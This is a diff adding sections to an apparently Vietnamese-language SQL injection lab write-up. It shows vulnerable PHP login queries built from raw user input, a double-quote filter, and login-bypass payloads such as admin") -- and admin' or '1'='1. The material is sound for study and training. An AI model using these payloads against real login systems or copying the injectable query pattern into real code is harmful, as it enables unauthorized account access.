@@ -503,6 +503,52 @@ admin' or '1'='1
 admin" or "1"="1 -- 
 ```
 
+![image](https://github.com/user-attachments/assets/006199f0-ec5d-4a01-881f-25e3a42a1b38)
+
+### LV3
+```php
+{
+	try {
+		include("db.php");
+		$database = make_connection("hashed_db");
+
+		$sql = "SELECT username FROM users WHERE username=LOWER(\"$username\") AND password=MD5(\"$password\")";
+		$query = $database->query($sql);
+		$row = $query->fetch_assoc(); // Get the first row
+```
+
+- by pass bằng cmt thôi.
+```bash
+admin") -- 
+```
+
+### LV4
+- Chall check valid.
+```php
+function checkValid($data)
+{
+    if (strpos($data, '"') !== false)
+        return false;
+    return true;
+}
+
+function loginHandler($username, $password)
+{
+    if (!checkValid($username) || !checkValid($password))
+        return "Hack detected";
+
+    try {
+        include("db.php");
+        $database = make_connection("hashed_db");
+
+        $sql = "SELECT username FROM users WHERE username=LOWER(\"$username\") AND password=MD5(\"$password\")";
+        $query = $database->query($sql);
+        $row = $query->fetch_assoc(); // Get the first row
+
+```
+- Có nghĩa là ta không được sử dụng `"`.
+![image](https://github.com/user-attachments/assets/be37814c-a5f0-4350-8080-82ca1af57c72)
+
 ![image](https://github.com/user-attachments/assets/defc8e9a-2f4c-4aa8-b333-30003824b5cf)
 
 ![image](https://github.com/user-attachments/assets/ed5863d6-0220-46cd-838c-602d2b6a1596)
